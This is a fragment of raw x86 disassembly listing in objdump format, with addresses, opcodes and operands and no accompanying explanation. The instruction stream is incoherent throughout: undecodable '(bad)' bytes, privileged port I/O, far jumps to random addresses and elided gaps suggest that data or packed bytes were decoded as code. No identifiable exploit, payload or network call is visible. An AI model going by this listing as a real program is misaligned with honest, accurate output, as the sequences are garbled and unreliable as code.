  4288db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288dc:	inc    ebp
  4288dd:	adc    al,0x20
  4288df:	lea    edi,[edi]
  4288e1:	out    dx,al
  4288e2:	cld    
  4288e3:	ret    
  4288e4:	repz mov dl,0x5a
  4288e7:	dec    esp
  4288e8:	xchg   BYTE PTR [ebx],al
  4288ea:	data16 outs dx,BYTE PTR ds:[esi]
  4288ec:	or     BYTE PTR [eax+eax*1+0x0],bl
	...
  428954:	add    BYTE PTR [eax],al
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0x3b819d0f],bx
  428964:	cdq    
  428965:	and    DWORD PTR [edi-0x4d],0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [edi-0x2379122b],ah
  428973:	dec    edi
  428974:	js     0x428946
  428976:	loop   0x428905
  428978:	adc    DWORD PTR [edi],0xffffffbc
  42897b:	mov    eax,ds:0x27ed3d9
  428980:	xor    edi,DWORD PTR es:[esi-0x227fa41e]
  428987:	and    al,0x7b
  428989:	jnp    0x4289a6
  42898b:	daa    
  42898c:	push   esi
  42898d:	xchg   edi,eax
  42898e:	mov    ah,0xf
  428990:	xlat   BYTE PTR ds:[ebx]
  428991:	jle    0x428955
  428993:	jp     0x4289aa
  428995:	out    dx,al
  428996:	in     eax,dx
  428997:	mov    ch,0xaa
  428999:	cwde   
  42899a:	cmp    BYTE PTR [ebx-0x49a5b491],ch
  4289a0:	addr16 xchg esp,eax
  4289a2:	pushf  
  4289a3:	rcr    BYTE PTR [ebp+0xb],0xd6
  4289a7:	sub    DWORD PTR [ecx+0x3],edx
  4289aa:	inc    edx
  4289ab:	popa   
  4289ac:	mov    al,ds:0xd2716435
  4289b1:	push   ebp
  4289b2:	mov    ah,0x55
  4289b4:	retf   
  4289b5:	leave  
  4289b6:	lahf   
  4289b7:	xchg   DWORD PTR [edi-0x3f],ebx
  4289ba:	es sbb al,0x15
  4289bd:	pushf  
  4289be:	cmp    edi,DWORD PTR ds:0x98c673c7
  4289c4:	call   0x71ca:0xfb5e80cf
  4289cb:	bound  ebx,QWORD PTR [esi+0x4644f734]
  4289d1:	lods   al,BYTE PTR ds:[esi]
  4289d2:	sub    BYTE PTR [edi+0xdfba528],0xcc
  4289d9:	sub    al,0xc2
  4289db:	jb     0x428962
  4289dd:	sub    esp,ecx
  4289df:	pusha  
  4289e0:	fiadd  WORD PTR [ebx-0x7b]
  4289e3:	jg     0x428a36
  4289e5:	cs jecxz 0x4289f0
  4289e8:	das    
  4289e9:	and    ebx,DWORD PTR [edx-0x6fea0f51]
  4289ef:	out    dx,al
  4289f0:	sub    dl,bh
  4289f2:	or     ah,BYTE PTR [edx]
  4289f4:	and    BYTE PTR [edi],ch
  4289f6:	pop    edi
  4289f7:	stc    
  4289f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289f9:	pop    esp
  4289fa:	pop    ebp
  4289fb:	(bad)  
  4289fc:	push   0xe49c8820
  428a01:	pop    eax
  428a02:	loope  0x4289d5
  428a04:	xor    ecx,0xfffffffb
  428a07:	loopne 0x42899c
  428a09:	push   ebp
  428a0a:	sahf   
  428a0b:	loope  0x4289f8
  428a0d:	out    dx,eax
  428a0e:	icebp  
  428a0f:	pop    edi
  428a10:	ss mov eax,0xa1b61922
  428a16:	test   DWORD PTR [ecx+0x8],ebp
  428a19:	aad    0x91
  428a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a1c:	mov    ecx,0xc49bb8a3
  428a21:	inc    ebx
  428a22:	ud0    esi,ebp
  428a25:	fs mov cl,0x7b
  428a28:	fcom   QWORD PTR [esi-0x78]
  428a2b:	into   
  428a2c:	sub    BYTE PTR [ebp+eiz*4+0x2],ch
  428a30:	ror    DWORD PTR [esi-0x552b1a1b],0x4
  428a37:	aad    0xa1
  428a39:	imul   edx,DWORD PTR [esi+0x21],0xeace6f92
  428a40:	test   esp,ecx
  428a42:	mov    edx,0x140d2d7c
  428a47:	call   DWORD PTR [edi]
  428a49:	xchg   DWORD PTR [edi+0x7db0cadf],esp
  428a4f:	iret   
  428a50:	pop    edi
  428a51:	out    dx,al
  428a52:	xchg   ecx,eax
  428a53:	stos   BYTE PTR es:[edi],al
  428a54:	mov    bh,0x17
  428a56:	pop    ebp
  428a57:	sub    bh,BYTE PTR cs:[edi+edx*1-0x1a8906b9]
  428a5f:	stc    
  428a60:	fwait
  428a61:	mov    cl,0x9
  428a63:	sbb    DWORD PTR [eax+0x11],edi
  428a66:	jno    0x428a94
  428a68:	cmp    eax,0x19931f5e
  428a6d:	sub    DWORD PTR [eax],eax
	...
  428ad3:	add    BYTE PTR [eax],al
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax-0x1e8abded]
  428ae5:	out    0x67,eax
  428ae7:	mov    ah,0x1
  428ae9:	add    BYTE PTR [eax],al
  428aeb:	add    DWORD PTR [eax],eax
  428aed:	add    bh,ah
  428aef:	or     bl,BYTE PTR [edi+ebx*1]
  428af2:	jnp    0x428a9a
  428af4:	retf   
  428af5:	js     0x428b4b
  428af7:	test   DWORD PTR [esi+0x7c73bc8e],edx
  428afd:	mov    al,0x30
  428aff:	mov    eax,ds:0x1e258083
  428b04:	sub    al,BYTE PTR [di]
  428b07:	out    dx,al
  428b08:	bound  edi,QWORD PTR [edi+edx*8]
  428b0b:	repnz cmp ebx,DWORD PTR [eax]
  428b0e:	test   eax,0x4db33948
  428b13:	add    DWORD PTR [esi+0x23009d32],eax
  428b19:	daa    
  428b1a:	sub    eax,0x4fab381e
  428b1f:	imul   ebx,edx,0xdb9f8b95
  428b25:	mov    ebx,0xa8d7bfc9
  428b2a:	ss pop es
  428b2c:	xor    al,0xed
  428b2e:	pushf  
  428b2f:	inc    edx
  428b30:	mov    edi,DWORD PTR [ebp+0x52030d0]
  428b36:	int3   
  428b37:	pop    eax
  428b38:	stos   DWORD PTR es:[edi],eax
  428b39:	data16 shl BYTE PTR [ecx+eiz*4-0x64],1
  428b3e:	mov    DWORD PTR [ebp-0x6bcc6722],0x7aa612f5
  428b48:	pop    esp
  428b49:	ret    
  428b4a:	mov    bh,0xf3
  428b4c:	and    eax,0x3e09acd9
  428b51:	push   esp
  428b52:	test   DWORD PTR [ebx],0x8a84d6f6
  428b58:	dec    esi
  428b59:	jl     0x428b9f
  428b5b:	fisubr DWORD PTR [ecx+eiz*1-0x27]
  428b5f:	push   ds
  428b60:	pop    ebx
  428b61:	(bad)  
  428b62:	or     edx,DWORD PTR [edi+0x43]
  428b65:	sar    BYTE PTR [ecx-0x65],cl
  428b68:	ret    0x6411
  428b6b:	adc    DWORD PTR [esi-0x3],ebx
  428b6e:	sub    BYTE PTR [eax-0x133a9925],dh
  428b74:	fs test eax,0x9840f3fd
  428b7a:	ins    BYTE PTR es:[edi],dx
  428b7b:	mov    es,WORD PTR [ebx]
  428b7d:	jb     0x428ba4
  428b7f:	call   0xd29764f3
  428b84:	adc    bl,cl
  428b86:	sub    BYTE PTR [edx-0xe3a014b],dh
  428b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b8d:	mov    bh,0x91
  428b8f:	lods   al,BYTE PTR ds:[esi]
  428b90:	or     BYTE PTR [eax+ebp*8+0xd9c9c9],dl
  428b97:	scas   al,BYTE PTR es:[edi]
  428b98:	fdivrp st(0),st
  428b9a:	push   edi
  428b9b:	stos   DWORD PTR es:[edi],eax
  428b9c:	cmc    
  428b9d:	adc    DWORD PTR [ecx+edx*4+0x51],esi
  428ba1:	movhps xmm4,QWORD PTR [edi]
  428ba4:	push   eax
  428ba5:	mov    edi,0x865f96e8
  428baa:	pop    eax
  428bab:	fldcw  WORD PTR [eax+edx*2+0x42]
  428baf:	scas   al,BYTE PTR es:[edi]
  428bb0:	jnp    0x428c0d
  428bb2:	int3   
  428bb3:	mov    BYTE PTR [ecx-0x320c6f33],dh
  428bb9:	aad    0x26
  428bbb:	pusha  
  428bbc:	outs   dx,BYTE PTR ds:[esi]
  428bbd:	xor    al,0xf3
  428bbf:	xchg   BYTE PTR [esi-0x5c445396],al
  428bc5:	scas   al,BYTE PTR es:[edi]
  428bc6:	inc    esi
  428bc7:	push   ebp
  428bc8:	jns    0x428bfb
  428bca:	dec    edx
  428bcb:	add    eax,0x4891bd63
  428bd0:	aas    
  428bd1:	idiv   DWORD PTR [edi]
  428bd3:	and    al,0xb2
  428bd5:	inc    esi
  428bd6:	adc    al,0x9b
  428bd8:	xchg   ecx,eax
  428bd9:	and    BYTE PTR [esi+0x4d],dl
  428bdc:	xor    DWORD PTR [eax-0xe],0x11
  428be0:	xor    al,0xf2
  428be2:	pop    esi
  428be3:	jmp    0x428c42
  428be5:	(bad)  
  428be6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428be7:	mov    esi,0x1c7d6b31
  428bec:	xchg   esp,eax
  428bed:	adc    eax,DWORD PTR [eax]
	...
  428c53:	add    BYTE PTR [eax],al
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x6a497b09
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [esi],cl
  428c6f:	arpl   WORD PTR [esi-0x280ba732],bp
  428c75:	fdiv   QWORD PTR [ebp-0x5461d372]
  428c7b:	mov    eax,ds:0xe589e309
  428c80:	dec    eax
  428c81:	dec    eax
  428c82:	xchg   ecx,eax
  428c83:	mov    ds:0x2261b5b2,eax
  428c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c89:	call   0x9f3e7625
  428c8e:	(bad)  
  428c8f:	loope  0x428c27
  428c91:	gs sahf 
  428c93:	xor    bh,BYTE PTR [ecx-0x7f06143e]
  428c99:	mov    ds:0xa652ac4c,al
  428c9e:	or     eax,DWORD PTR [bp+si+0x5a0f]
  428ca3:	jg     0x428cb6
  428ca5:	mov    cl,0xdc
  428ca7:	cdq    
  428ca8:	cmc    
  428ca9:	xchg   ebx,eax
  428caa:	cmp    ebp,DWORD PTR [ebx]
  428cac:	cmp    DWORD PTR [edx+0x65458076],edi
  428cb2:	int    0x70
  428cb4:	xor    BYTE PTR ds:0x13705d0f,0x59
  428cbb:	(bad)  
  428cbc:	cmp    eax,DWORD PTR [eax]
  428cbe:	mov    bl,dh
  428cc0:	test   al,0x23
  428cc2:	jne    0x428c6d
  428cc4:	out    0xba,al
  428cc6:	(bad)  
  428cc7:	fucomp st(7)
  428cc9:	dec    edi
  428cca:	fwait
  428ccb:	mov    eax,0x8dcffb97
  428cd0:	push   es
  428cd1:	loope  0x428cf6
  428cd3:	jp     0x428d27
  428cd5:	push   ecx
  428cd6:	arpl   WORD PTR [esi-0x13],di
  428cd9:	fisub  WORD PTR [esi-0x34801dba]
  428cdf:	and    BYTE PTR [eax+0x60cae41f],cl
  428ce5:	dec    edi
  428ce6:	jle    0x428d16
  428ce8:	or     eax,0x1d8b5ea6
  428ced:	adc    esp,DWORD PTR [edx-0x61b8b632]
  428cf3:	imul   BYTE PTR [edx-0x3d279104]
  428cf9:	out    dx,al
  428cfa:	or     BYTE PTR [eax],bh
  428cfc:	xor    cl,BYTE PTR [ecx]
  428cfe:	push   0xd7564b
  428d03:	or     esp,DWORD PTR [edi-0x7eebb061]
  428d09:	iret   
  428d0a:	xchg   ebp,eax
  428d0b:	test   al,0xea
  428d0d:	adc    cl,bh
  428d0f:	mov    edi,0x4d7b4ff7
  428d14:	mov    BYTE PTR [edx],dl
  428d16:	in     eax,dx
  428d17:	inc    ecx
  428d18:	sti    
  428d19:	or     ebx,DWORD PTR [edi+esi*8]
  428d1c:	(bad)  
  428d1d:	xchg   ebp,eax
  428d1e:	and    DWORD PTR [ebx+0x58],ebx
  428d21:	xchg   edi,eax
  428d22:	sub    eax,0x1913615e
  428d27:	pop    edx
  428d28:	mov    esi,DWORD PTR [ebx-0x12]
  428d2b:	std    
  428d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d2d:	scas   eax,DWORD PTR es:[edi]
  428d2e:	xchg   edi,eax
  428d2f:	mov    dl,0xda
  428d31:	add    DWORD PTR [eax-0x45fcf335],0x30
  428d38:	dec    ebp
  428d39:	mov    ah,0x34
  428d3b:	sbb    dh,ah
  428d3d:	mov    ebp,0xa37e01cb
  428d42:	jl     0x428d97
  428d44:	cmp    dl,dl
  428d46:	xchg   edx,eax
  428d47:	mov    ecx,DWORD PTR [edi+0x5cdb1914]
  428d4d:	jle    0x428dc6
  428d4f:	mov    ebp,0x3c6c629c
  428d54:	bound  ecx,QWORD PTR [ecx+0x7]
  428d57:	cmp    DWORD PTR [ebp+0x6c8f190b],eax
  428d5d:	clc    
  428d5e:	rcr    BYTE PTR [ebx-0x61],0x67
  428d62:	imul   ebp,ebp,0xfc9ee68b
  428d68:	stos   DWORD PTR es:[edi],eax
  428d69:	or     al,0x7d
  428d6b:	(bad)  
  428d6c:	and    BYTE PTR [eax+eax*1+0x0],bl
	...
  428dd3:	add    BYTE PTR [eax],al
  428dd5:	add    BYTE PTR [ecx-0xace0e4b],al
  428ddb:	jne    0x428d9e
  428ddd:	mov    ch,0x90
  428ddf:	int3   
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x761f
  428de4:	pushf  
  428de5:	pop    ebx
  428de6:	addr16 mov dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    ah,cl
  428def:	mov    bl,0xfa
  428df1:	(bad)  
  428df2:	sar    DWORD PTR [eax+0x7cf579e8],1
  428df8:	mov    WORD PTR [edx],ds
  428dfa:	pusha  
  428dfb:	arpl   WORD PTR [eax-0x3d8928c1],sp
  428e01:	jecxz  0x428df7
  428e03:	sub    al,0x8c
  428e05:	stc    
  428e06:	fcmovnbe st,st(0)
  428e08:	fwait
  428e09:	scas   al,BYTE PTR es:[edi]
  428e0a:	mov    dh,0xf4
  428e0c:	adc    edi,DWORD PTR [ecx]
  428e0e:	dec    edx
  428e0f:	dec    ebx
  428e10:	rol    DWORD PTR [ecx],1
  428e12:	sbb    DWORD PTR ds:0x2653721e,ebp
  428e18:	pusha  
  428e19:	sub    BYTE PTR [ebx+0x78],cl
  428e1c:	lock fwait
  428e1e:	inc    edx
  428e1f:	dec    edx
  428e20:	lahf   
  428e21:	jnp    0x428e97
  428e23:	popf   
  428e24:	in     al,dx
  428e25:	jle    0x428e4d
  428e27:	les    ecx,FWORD PTR [eax]
  428e29:	jno    0x428e02
  428e2b:	sbb    al,0xf1
  428e2d:	ds cmc 
  428e2f:	dec    esi
  428e30:	mov    ecx,0x140d81cc
  428e35:	add    ah,BYTE PTR [ecx+0x72ebba91]
  428e3b:	lds    ebx,FWORD PTR [esi+0x74]
  428e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428e40:	shl    BYTE PTR [esp+edi*1-0x61c68ca0],1
  428e47:	sbb    bh,BYTE PTR [ebx-0x3]
  428e4a:	imul   edx
  428e4c:	lea    edx,[esi+ebx*8-0x112ab80e]
  428e53:	out    dx,al
  428e54:	ficomp WORD PTR [ebx]
  428e56:	push   eax
  428e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e58:	stos   BYTE PTR es:[edi],al
  428e59:	loop   0x428e67
  428e5b:	mul    BYTE PTR [eax+ebx*8-0x32]
  428e5f:	mov    dl,0x78
  428e61:	inc    ebp
  428e62:	test   ebp,ebp
  428e64:	into   
  428e65:	iret   
  428e66:	jmp    0x428e8c
  428e68:	aaa    
  428e69:	sti    
  428e6a:	xchg   edi,eax
  428e6b:	sbb    al,0x9e
  428e6d:	dec    ecx
  428e6e:	pop    eax
  428e6f:	mov    ds:0x606ab29e,eax
  428e74:	xor    bl,ah
  428e76:	add    ch,BYTE PTR [eax]
  428e78:	dec    ebx
  428e79:	cmc    
  428e7a:	pop    edx
  428e7b:	(bad)  
  428e7c:	retf   0x24a
  428e7f:	and    al,0x90
  428e81:	pop    ecx
  428e82:	int3   
  428e83:	add    al,ah
  428e85:	xlat   BYTE PTR ds:[ebx]
  428e86:	sbb    DWORD PTR [edi*1+0x55136e],0xf18769f
  428e91:	pop    eax
  428e92:	sbb    esi,DWORD PTR [eax-0x1930ffb9]
  428e98:	jl     0x428e42
  428e9a:	sar    BYTE PTR [esi-0xb2dcbed],1
  428ea0:	call   0xd292c83d
  428ea5:	jno    0x428ec9
  428ea7:	aas    
  428ea8:	adc    DWORD PTR [edi+0x53],0x9
  428eac:	xchg   esi,eax
  428ead:	adc    al,0xfa
  428eaf:	nop
  428eb0:	dec    esp
  428eb1:	mov    ss,WORD PTR [ecx-0x28309d2]
  428eb7:	mov    ebp,0x9ba78ef5
  428ebc:	or     dl,ch
  428ebe:	mov    ds:0xb720b85c,eax
  428ec3:	in     al,dx
  428ec4:	dec    ecx
  428ec5:	mov    ebx,0xd337a3c
  428eca:	adc    dl,ch
  428ecc:	jmp    0x9de2:0x371fa98a
  428ed3:	into   
  428ed4:	div    ch
  428ed6:	cwde   
  428ed7:	les    ebp,FWORD PTR [eax-0x54ef70d7]
  428edd:	inc    ebx
  428ede:	xor    al,0x97
  428ee0:	inc    edi
  428ee1:	sub    esp,DWORD PTR [ebx+0x6c22a09c]
  428ee7:	push   ebp
  428ee8:	and    BYTE PTR [ebx+0x56d45442],al
	...
  428f56:	dec    edi
  428f57:	pop    ebp
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0xa0
  428f63:	cmp    dl,bl
  428f65:	daa    
  428f66:	addr16 mov bh,0x1
  428f69:	add    BYTE PTR [eax],al
  428f6b:	add    DWORD PTR [eax],eax
  428f6d:	add    ch,al
  428f6f:	inc    edi
  428f70:	inc    esp
  428f71:	sub    al,0x7a
  428f73:	stc    
  428f74:	inc    eax
  428f75:	or     ebp,esi
  428f77:	fcmovb st,st(7)
  428f79:	(bad)  
  428f7a:	cmp    bh,BYTE PTR [esi+0x33ec6379]
  428f80:	push   ss
  428f81:	push   esp
  428f82:	adc    eax,0xd79133a9
  428f87:	ins    DWORD PTR es:[edi],dx
  428f88:	xor    DWORD PTR [edi],0x4b
  428f8b:	minps  xmm6,XMMWORD PTR [edx]
  428f8e:	add    ch,BYTE PTR [ebp+0x1f2db963]
  428f94:	pop    esp
  428f95:	sahf   
  428f96:	and    al,0x69
  428f98:	(bad)  [esi+0x51221772]
  428f9e:	cmc    
  428f9f:	(bad)  
  428fa0:	ffree  st(6)
  428fa2:	fnsave ds:0x72e139dc
  428fa8:	cs xchg edx,eax
  428faa:	stc    
  428fab:	fist   WORD PTR [edi-0x4f]
  428fae:	gs xchg edi,eax
  428fb0:	mov    edx,DWORD PTR [edi]
  428fb2:	mov    bh,0x7a
  428fb4:	inc    eax
  428fb5:	rol    DWORD PTR [eax+ebp*4],1
  428fb8:	and    BYTE PTR [esi],0x97
  428fbb:	ficom  DWORD PTR [edx+0x4c]
  428fbe:	jbe    0x42903d
  428fc0:	inc    edi
  428fc1:	retf   
  428fc2:	ficomp WORD PTR [ebx+0x1a]
  428fc5:	jne    0x42902b
  428fc7:	jnp    0x428faa
  428fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428fca:	and    DWORD PTR [edi],ebp
  428fcc:	int    0xd
  428fce:	scas   al,BYTE PTR es:[edi]
  428fcf:	addr16 (bad) 
  428fd1:	or     eax,0x153f1d37
  428fd6:	jb     0x42903d
  428fd8:	cmp    DWORD PTR [edi],esp
  428fda:	int3   
  428fdb:	(bad)  [edx+0x6f93b2bc]
  428fe1:	or     eax,0xcfe01d1
  428fe6:	rcr    DWORD PTR [edx+0x3a],0x9b
  428fea:	jb     0x429050
  428fec:	sub    al,0x78
  428fee:	sub    BYTE PTR [esi],bl
  428ff0:	gs jecxz 0x429034
  428ff3:	es cs jecxz 0x428f90
  428ff7:	pop    es
  428ff8:	cmp    eax,0x69ef0816
  428ffd:	ficomp WORD PTR [esi+0x475e7963]
  429004:	pushf  
  429005:	repnz adc ch,0x61
  429009:	xor    BYTE PTR [edi+0x6db04ba],ch
  42900f:	nop
  429010:	jnp    0x429021
  429012:	cwde   
  429013:	outs   dx,BYTE PTR ds:[esi]
  429014:	das    
  429015:	push   edx
  429016:	inc    edx
  429017:	dec    ecx
  429018:	inc    esi
  429019:	aad    0x9a
  42901b:	xor    ah,ch
  42901d:	ins    DWORD PTR es:[edi],dx
  42901e:	pop    edi
  42901f:	push   cs
  429020:	jne    0x428fb0
  429022:	sub    ecx,esp
  429024:	rcl    DWORD PTR [ecx+0x1],1
  429027:	push   0x5ecd5fb
  42902c:	sub    edi,DWORD PTR [ecx+0xd5ae305]
  429032:	iret   
  429033:	and    DWORD PTR [ecx+edi*1-0x47f052c5],edx
  42903a:	shl    BYTE PTR [ebp-0x56],cl
  42903d:	mov    esi,0xd3b9e5c9
  429042:	and    al,0x9
  429044:	nop
  429045:	imul   edx,ebp,0xffffffd8
  429048:	das    
  429049:	cs cdq 
  42904b:	xor    ebx,esi
  42904d:	and    ebp,esp
  42904f:	push   cs
  429050:	sub    eax,DWORD PTR [edi+0x1f]
  429053:	dec    ecx
  429054:	or     ebx,DWORD PTR [eax]
  429056:	pusha  
  429057:	sbb    DWORD PTR [edx],eax
  429059:	mov    edx,?
  42905b:	add    al,BYTE PTR [eax+0x165319a]
  429061:	(bad)  
  429062:	sbb    eax,0x226e9150
  429067:	repz aad 0xd8
  42906a:	mov    ds,WORD PTR [esi]
  42906c:	mov    dl,0x89
	...
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0xf9fc7b77
  4290e3:	mov    dl,0xf9
  4290e5:	mov    ds:0x1b867,eax
  4290ea:	add    BYTE PTR [ecx],al
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	(bad)  
  4290ef:	call   0xca2d:0x31425452
  4290f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290f7:	mov    ds:0x3b93db16,eax
  4290fc:	mov    bl,0x47
  4290fe:	xor    esp,0xffffffb4
  429101:	ins    DWORD PTR es:[edi],dx
  429102:	or     bh,0xa2
  429105:	xchg   edi,eax
  429106:	shld   DWORD PTR [ebp+0x35428278],edi,0xb7
  42910e:	add    eax,0x1a33e0f0
  429113:	cmp    eax,esp
  429115:	cmp    ecx,ebp
  429117:	mov    ebp,0xc4fe86c0
  42911c:	cmc    
  42911d:	xchg   ebx,eax
  42911e:	mov    dl,0xb2
  429120:	sbb    DWORD PTR [esi-0x66],edi
  429123:	and    bl,bl
  429125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429126:	mov    esp,0x6fbe3720
  42912b:	pop    es
  42912c:	mov    bh,0x51
  42912e:	shl    cl,cl
  429130:	bound  ebp,QWORD PTR [ecx+0x36]
  429133:	mul    edi
  429135:	adc    DWORD PTR [esi+ecx*4-0x73],0x82435c86
  42913d:	(bad)  
  42913e:	mov    ebx,0x50ff29aa
  429143:	(bad)
  429146:	or     BYTE PTR [ecx+0x26],dl
  429149:	mov    ebp,0xb6ade872
  42914e:	out    0xdd,eax
  429150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429151:	psadbw mm1,QWORD PTR [esp+esi*2-0x73]
  429156:	shl    BYTE PTR [ebx+ebx*4-0x60],1
  42915a:	jmp    ebx
  42915c:	jle    0x429155
  42915e:	shr    DWORD PTR [eax+ecx*2+0x5946286a],cl
  429165:	ins    DWORD PTR es:[edi],dx
  429166:	pop    esi
  429167:	(bad)  
  429168:	or     ch,ch
  42916a:	sbb    cl,BYTE PTR [eax]
  42916c:	js     0x429191
  42916e:	push   ds
  42916f:	pop    ss
  429170:	adc    ch,BYTE PTR [ecx]
  429172:	mov    esp,0x5cc5c406
  429177:	nop    edx
  42917a:	ja     0x4291c2
  42917c:	mov    dh,0x38
  42917e:	mov    ecx,0x5d1780d
  429183:	addr16 sub eax,0xebcba9f7
  429189:	dec    esi
  42918a:	xor    DWORD PTR [ecx-0x6bb28160],0x8c4341e2
  429194:	pop    esi
  429195:	pop    ebp
  429196:	jbe    0x4291a4
  429198:	dec    eax
  429199:	push   esp
  42919a:	out    0x7a,al
  42919c:	xchg   BYTE PTR [eax+0x38],ah
  42919f:	icebp  
  4291a0:	or     edx,0xd0c7e2e5
  4291a6:	aam    0x6
  4291a8:	mov    ah,0xb1
  4291aa:	js     0x429183
  4291ac:	call   0xcdb7077b
  4291b1:	ins    BYTE PTR es:[edi],dx
  4291b2:	js     0x4291e6
  4291b4:	or     eax,0x252dc594
  4291b9:	movzx  eax,BYTE PTR [esi+0x3d68c4a]
  4291c0:	inc    ebp
  4291c1:	dec    BYTE PTR [eax-0x55]
  4291c4:	ds jp  0x4291d0
  4291c7:	pop    eax
  4291c8:	das    
  4291c9:	inc    edi
  4291ca:	in     al,dx
  4291cb:	clc    
  4291cc:	mov    esi,0x81f2e804
  4291d1:	stos   DWORD PTR es:[edi],eax
  4291d2:	sbb    esi,DWORD PTR [ecx+0x7a]
  4291d5:	and    ebx,edi
  4291d7:	xor    BYTE PTR [ebx-0x764c9edb],dh
  4291dd:	mov    cl,0x4
  4291df:	adc    eax,0xa256674f
  4291e4:	xor    eax,0x9f9e09a0
  4291e9:	mov    edx,0x38ce6759
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [esi+eiz*8+0x67a03f88],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [edi-0x25],bh
  429270:	push   edi
  429271:	jmp    0x6fbe:0x93746c1e
  429278:	cmp    ebp,eax
  42927a:	inc    eax
  42927b:	jb     0x4292cc
  42927d:	fbld   TBYTE PTR [esi]
  42927f:	fdiv   DWORD PTR [edi+0x3b]
  429282:	xor    bh,al
  429284:	stos   BYTE PTR es:[edi],al
  429285:	pop    ds
  429286:	popa   
  429287:	xor    cl,0x68
  42928a:	test   eax,0xa8b0cbb1
  42928f:	popf   
  429290:	mov    esp,ebp
  429292:	(bad)  
  429293:	int    0xc4
  429295:	cmp    ecx,ebp
  429297:	push   cs
  429298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429299:	ins    BYTE PTR es:[edi],dx
  42929a:	pop    ebx
  42929b:	adc    DWORD PTR [ebx-0x3480d56c],ebx
  4292a1:	add    al,0xdb
  4292a3:	sbb    al,0x44
  4292a5:	ret    0x7abf
  4292a8:	push   esp
  4292a9:	sbb    ebp,edx
  4292ab:	mov    esp,0x1ce4740e
  4292b0:	xor    DWORD PTR [esi],esp
  4292b2:	cmp    edx,esp
  4292b4:	inc    edx
  4292b5:	sar    dh,cl
  4292b7:	into   
  4292b8:	mov    ebp,0x473b271a
  4292bd:	add    al,0x82
  4292bf:	scas   al,BYTE PTR es:[edi]
  4292c0:	adc    al,0x11
  4292c2:	xchg   esi,eax
  4292c3:	mov    esp,0xe67b69b8
  4292c8:	xor    cl,0xc7
  4292cb:	adc    eax,0xe6d5faca
  4292d0:	sbb    DWORD PTR [edi],edx
  4292d2:	push   ebx
  4292d3:	xor    esi,DWORD PTR es:[ebp-0xa0ae4b]
  4292da:	pop    edx
  4292db:	and    eax,DWORD PTR [eax-0x77611988]
  4292e1:	ja     0x429350
  4292e3:	es cwde 
  4292e5:	push   esp
  4292e6:	push   0xc056afed
  4292eb:	sub    eax,ecx
  4292ed:	sub    DWORD PTR [ebp+0x35719d86],edx
  4292f3:	jle    0x429343
  4292f5:	xor    eax,0xd32a37e
  4292fa:	shl    ecx,cl
  4292fc:	leave  
  4292fd:	jl     0x4292e5
  4292ff:	mov    al,0x0
  429301:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429303:	xchg   BYTE PTR [ecx],dl
  429305:	out    dx,al
  429306:	pop    ecx
  429307:	test   BYTE PTR [edi-0x61cecc48],0x78
  42930e:	scas   al,BYTE PTR es:[edi]
  42930f:	xchg   esi,eax
  429310:	jmp    0x7f96:0x9c120708
  429317:	lods   eax,DWORD PTR ds:[esi]
  429318:	out    0xc5,eax
  42931a:	idiv   BYTE PTR [ebp+eiz*8-0x42]
  42931e:	push   eax
  42931f:	inc    ecx
  429320:	repnz pop ebx
  429322:	fs out 0x36,eax
  429325:	dec    ecx
  429326:	mov    ebp,0x57ac7813
  42932b:	bound  eax,QWORD PTR [ecx-0x771c8cb7]
  429331:	hlt    
  429332:	out    0x14,eax
  429334:	or     eax,DWORD PTR [ecx+eax*4+0x63a0d33c]
  42933b:	les    ebp,FWORD PTR [ecx]
  42933d:	mov    esp,0x105cca01
  429342:	dec    esi
  429343:	xor    cl,cl
  429345:	popf   
  429346:	retf   0x533e
  429349:	and    edi,DWORD PTR [ebx]
  42934b:	leave  
  42934c:	mov    esp,0x40beb6a8
  429351:	es into 
  429353:	inc    DWORD PTR [eax-0x7b92b5]
  429359:	push   esi
  42935a:	sahf   
  42935b:	jge    0x42932b
